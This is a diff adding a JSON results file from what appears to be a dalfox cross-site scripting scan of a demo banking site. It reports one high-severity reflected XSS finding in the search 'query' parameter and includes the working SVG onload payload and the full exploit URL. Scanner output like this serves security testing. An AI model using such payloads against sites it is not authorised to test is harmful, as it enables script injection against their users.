@@ -1,0 +1,42 @@
+{
+  "findings": [
+    {
+      "confidence": "high",
+      "confidence_reason": "payload reached an executable position in the parsed response",
+      "cwe": "CWE-79",
+      "data": "https://demo.testfire.net/search.jsp?query=%3Csvg%20onload%3Dalert%281%29%20class%3Ddlx5839213c%3E",
+      "detection_method": "reflection",
+      "evidence": "DOM verification successful for param query (DOM marker)",
+      "inject_type": "inHTML",
+      "location": "Query",
+      "message_id": 606,
+      "message_str": "Triggered XSS Payload (DOM marker): query=<svg onload=alert(1) class=dlx5839213c>",
+      "method": "GET",
+      "param": "query",
+      "payload": "<svg onload=alert(1) class=dlx5839213c>",
+      "severity": "High",
+      "type": "V",
+      "type_description": "Vulnerable - dalfox asserts this input is exploitable; act on it"
+    }
+  ],
+  "meta": {
+    "dalfox_version": "3.2.4",
+    "dedup_mode": "exact",
+    "failed_requests": 0,
+    "findings_count": 1,
+    "incomplete": false,
+    "scan_duration_ms": 12043,
+    "target_summary": [
+      {
+        "findings_count": 1,
+        "status": "findings",
+        "target": "https://demo.testfire.net/search.jsp?query=test"
+      }
+    ],
+    "targets": [
+      "https://demo.testfire.net/search.jsp?query=test"
+    ],
+    "targets_deduplicated": 0,
+    "total_requests": 23
+  }
+}
